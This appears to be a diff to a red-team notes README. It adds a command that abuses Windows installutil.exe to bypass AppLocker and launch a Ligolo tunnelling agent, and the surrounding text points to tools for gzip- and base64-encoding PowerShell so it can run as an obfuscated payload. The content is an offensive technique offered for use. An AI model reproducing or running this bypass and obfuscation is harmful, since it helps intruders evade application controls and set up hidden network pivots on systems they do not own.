@@ -5,6 +5,12 @@ This repository contains notes, ideas, and experiments for various techniques an
 # Misc Snippets
 Unsorted code snippets that dont really have a home elsewhere
 
+Runner for ligolo for bypassing applocker to get ligolo agent run from powershell.
+```powershell
+cmd /c "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /uninstall /logfile= /LogToConsole=false C:\programdata\LigoloShellRunner.exe"
+```
+
+
 Gzip and Base64 encode Powershell strings and script and execute
 - https://www.zickty.com/texttogzip
 - https://gchq.github.io/CyberChef/#recipe=Gzip('Dynamic%20Huffman%20Coding','','',false)To_Base64('A-Za-z0-9%2B/%3D')&input=d2hvYW1pIC9hbGw&oeol=FF
